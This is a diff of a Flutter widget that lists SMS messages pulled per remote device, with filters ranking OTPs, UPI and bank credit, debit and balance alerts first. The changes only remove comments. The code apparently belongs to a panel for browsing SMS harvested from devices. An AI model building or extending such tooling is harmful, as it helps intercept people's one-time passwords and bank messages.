@@ -14,17 +14,16 @@ enum TimeFilter { all, today, yesterday, week, month }
 
 enum ContentFilter { all, hasLink, hasNumber, hasOtp, long, short }
 
-// 🎯 اولویت‌بندی فیلترها
 enum CategoryFilter {
-  all,          // همه
-  otp,          // 1️⃣ اولویت اول - OTP
-  upi,          // 2️⃣ اولویت دوم - UPI
-  credit,       // 3️⃣ اولویت سوم - واریز
-  debit,        // 4️⃣ اولویت چهارم - برداشت
-  balance,      // 5️⃣ اولویت پنجم - موجودی
-  banking,      // 6️⃣ همه بانکی‌ها
-  promotional,  // 7️⃣ تبلیغاتی
-  important     // 8️⃣ مهم
+  all,
+  otp,
+  upi,
+  credit,
+  debit,
+  balance,
+  banking,
+  promotional,
+  important
 }
 
 class DeviceSmsTab extends StatefulWidget {
@@ -54,7 +53,6 @@ class _DeviceSmsTabState extends State<DeviceSmsTab> {
   String _searchQuery = '';
   bool _showAdvancedFilters = false;
 
-  // 🎯 Pagination Variables
   int _currentPage = 1;
   int _pageSize = 100;
   int _totalMessages = 0;
@@ -71,7 +69,6 @@ class _DeviceSmsTabState extends State<DeviceSmsTab> {
   @override
   void didUpdateWidget(DeviceSmsTab oldWidget) {
     super.didUpdateWidget(oldWidget);
-    // Refresh messages when device changes
     if (oldWidget.device.deviceId != widget.device.deviceId) {
       _fetchMessages();
     }
@@ -190,7 +187,6 @@ class _DeviceSmsTabState extends State<DeviceSmsTab> {
 
   List<SmsMessage> _applyCategoryFilter(List<SmsMessage> messages) {
     switch (_categoryFilter) {
-    // 1️⃣ اولویت اول - OTP
       case CategoryFilter.otp:
         final otpRegex = RegExp(r'\b\d{4,6}\b');
         return messages
@@ -204,9 +200,8 @@ class _DeviceSmsTabState extends State<DeviceSmsTab> {
                 m.body.toLowerCase().contains('authenticate')))
             .toList();
 
-    // 2️⃣ اولویت دوم - UPI
       case CategoryFilter.upi:
-        final upiIdRegex = RegExp(r'\b[\w.]+@[\w]+\b'); // مثل: name@paytm
+        final upiIdRegex = RegExp(r'\b[\w.]+@[\w]+\b');
         return messages
             .where((m) =>
         m.body.toLowerCase().contains('upi') ||
@@ -218,7 +213,6 @@ class _DeviceSmsTabState extends State<DeviceSmsTab> {
             upiIdRegex.hasMatch(m.body))
             .toList();
 
-    // 3️⃣ اولویت سوم - Credit (واریز)
       case CategoryFilter.credit:
         return messages
             .where((m) =>
@@ -232,7 +226,6 @@ class _DeviceSmsTabState extends State<DeviceSmsTab> {
                 RegExp(r'Rs\.?\s*[\d,]+').hasMatch(m.body)))
             .toList();
 
-    // 4️⃣ اولویت چهارم - Debit (برداشت)
       case CategoryFilter.debit:
         return messages
             .where((m) =>
@@ -243,7 +236,6 @@ class _DeviceSmsTabState extends State<DeviceSmsTab> {
             m.body.toLowerCase().contains('purchase'))
             .toList();
 
-    // 5️⃣ اولویت پنجم - Balance (موجودی)
       case CategoryFilter.balance:
         return messages
             .where((m) =>
@@ -251,11 +243,10 @@ class _DeviceSmsTabState extends State<DeviceSmsTab> {
             m.body.toLowerCase().contains('bal') ||
             m.body.toLowerCase().contains('available balance') ||
             m.body.toLowerCase().contains('total balance')) &&
-            !m.body.toLowerCase().contains('low balance') // فقط موجودی، نه هشدار
+            !m.body.toLowerCase().contains('low balance')
         )
             .toList();
 
-    // 6️⃣ همه بانکی‌ها
       case CategoryFilter.banking:
         return messages
             .where((m) =>
@@ -270,7 +261,6 @@ class _DeviceSmsTabState extends State<DeviceSmsTab> {
             m.body.toLowerCase().contains('upi'))
             .toList();
 
-    // 7️⃣ تبلیغاتی
       case CategoryFilter.promotional:
         return messages
             .where((m) =>
@@ -281,7 +271,6 @@ class _DeviceSmsTabState extends State<DeviceSmsTab> {
             m.body.toLowerCase().contains('promo'))
             .toList();
 
-    // 8️⃣ مهم
       case CategoryFilter.important:
         return messages
             .where((m) =>
@@ -387,12 +376,11 @@ class _DeviceSmsTabState extends State<DeviceSmsTab> {
             children: [
               const SizedBox(height: 12),
 
-              // Search Bar & Actions
               Padding(
                 padding: const EdgeInsets.fromLTRB(12, 0, 12, 8),
                 child: Row(
                   children: [
-                    // Search
+
                     Expanded(
                       child: Container(
                         decoration: BoxDecoration(
@@ -466,8 +454,8 @@ class _DeviceSmsTabState extends State<DeviceSmsTab> {
                       ),
                     ),
                     const SizedBox(width: 8),
-                    // Actions
-                    // Actions
+
+
                     _ActionButton(
                       icon: Icons.refresh_rounded,
                       color: const Color(0xFF14B8A6),
@@ -507,9 +495,8 @@ class _DeviceSmsTabState extends State<DeviceSmsTab> {
                 ),
               ),
 
-              // Advanced Filters
               if (_showAdvancedFilters) ...[
-                // Time Filter
+
                 Padding(
                   padding: const EdgeInsets.fromLTRB(12, 0, 12, 6),
                   child: Column(
@@ -546,7 +533,6 @@ class _DeviceSmsTabState extends State<DeviceSmsTab> {
                   ),
                 ),
 
-                // Content Filter
                 Padding(
                   padding: const EdgeInsets.fromLTRB(12, 0, 12, 6),
                   child: Column(
@@ -583,7 +569,6 @@ class _DeviceSmsTabState extends State<DeviceSmsTab> {
                   ),
                 ),
 
-                // Category Filter
                 Padding(
                   padding: const EdgeInsets.fromLTRB(12, 0, 12, 8),
                   child: Column(
@@ -621,7 +606,6 @@ class _DeviceSmsTabState extends State<DeviceSmsTab> {
                 ),
               ],
 
-              // Messages List
               Expanded(
                 child: _isLoading
                     ? Center(
@@ -701,7 +685,6 @@ class _DeviceSmsTabState extends State<DeviceSmsTab> {
             ],
           ),
 
-          // Floating Pagination with Page Size Menu (WhatsApp style)
           if (!_isLoading && _messages.isNotEmpty && _totalPages > 1)
             Positioned(
               bottom: MediaQuery.of(context).padding.bottom + 16,
@@ -709,7 +692,7 @@ class _DeviceSmsTabState extends State<DeviceSmsTab> {
               child: Row(
                 mainAxisSize: MainAxisSize.min,
                 children: [
-                  // Page Size Menu Button
+
                   Material(
                     elevation: 8,
                     borderRadius: BorderRadius.circular(25),
@@ -820,7 +803,6 @@ class _DeviceSmsTabState extends State<DeviceSmsTab> {
                   ),
                   const SizedBox(width: 8),
 
-                  // Pagination Controls
                   Material(
                     elevation: 8,
                     borderRadius: BorderRadius.circular(30),
@@ -844,7 +826,7 @@ class _DeviceSmsTabState extends State<DeviceSmsTab> {
                       child: Row(
                         mainAxisSize: MainAxisSize.min,
                         children: [
-                          // Previous Button
+
                           Material(
                             color: Colors.transparent,
                             child: InkWell(
@@ -869,7 +851,6 @@ class _DeviceSmsTabState extends State<DeviceSmsTab> {
                             ),
                           ),
 
-                          // Page Info
                           Container(
                             padding: const EdgeInsets.symmetric(horizontal: 8),
                             child: Text(
@@ -883,7 +864,6 @@ class _DeviceSmsTabState extends State<DeviceSmsTab> {
                             ),
                           ),
 
-                          // Next Button
                           Material(
                             color: Colors.transparent,
                             child: InkWell(
@@ -1031,7 +1011,6 @@ class _DeviceSmsTabState extends State<DeviceSmsTab> {
   }
 }
 
-// Action Button Widget
 class _ActionButton extends StatelessWidget {
   final IconData icon;
   final Color color;
@@ -1081,7 +1060,6 @@ class _ActionButton extends StatelessWidget {
   }
 }
 
-// Small Filter Chip Widget
 class _SmallFilterChip extends StatelessWidget {
   final String label;
   final bool selected;
@@ -1147,7 +1125,6 @@ class _SmallFilterChip extends StatelessWidget {
   }
 }
 
-// SMS Card Widget
 class _SmsCard extends StatefulWidget {
   final SmsMessage message;
   final bool isDark;
@@ -1333,7 +1310,7 @@ class _SmsCardState extends State<_SmsCard> {
                                   ],
                                 ),
                               ),
-                              // 1️⃣ OTP Badge
+
                               if (_isOTP(widget.message.body)) ...[
                                 const SizedBox(width: 6),
                                 Container(
@@ -1373,7 +1350,7 @@ class _SmsCardState extends State<_SmsCard> {
                                   ),
                                 ),
                               ],
-                              // 2️⃣ UPI Badge
+
                               if (_isUPI(widget.message.body)) ...[
                                 const SizedBox(width: 6),
                                 Container(
@@ -1413,7 +1390,7 @@ class _SmsCardState extends State<_SmsCard> {
                                   ),
                                 ),
                               ],
-                              // 3️⃣ Credit Badge
+
                               if (_isCredit(widget.message.body)) ...[
                                 const SizedBox(width: 6),
                                 Container(
@@ -1453,7 +1430,7 @@ class _SmsCardState extends State<_SmsCard> {
                                   ),
                                 ),
                               ],
-                              // 4️⃣ Debit Badge
+
                               if (_isDebit(widget.message.body)) ...[
                                 const SizedBox(width: 6),
                                 Container(
@@ -1493,7 +1470,7 @@ class _SmsCardState extends State<_SmsCard> {
                                   ),
                                 ),
                               ],
-                              // 5️⃣ Balance Badge
+
                               if (_isBalance(widget.message.body)) ...[
                                 const SizedBox(width: 6),
                                 Container(
@@ -1533,7 +1510,7 @@ class _SmsCardState extends State<_SmsCard> {
                                   ),
                                 ),
                               ],
-                              // 6️⃣ Banking Badge
+
                               if (_isBanking(widget.message.body) &&
                                   !_isOTP(widget.message.body) &&
                                   !_isUPI(widget.message.body) &&
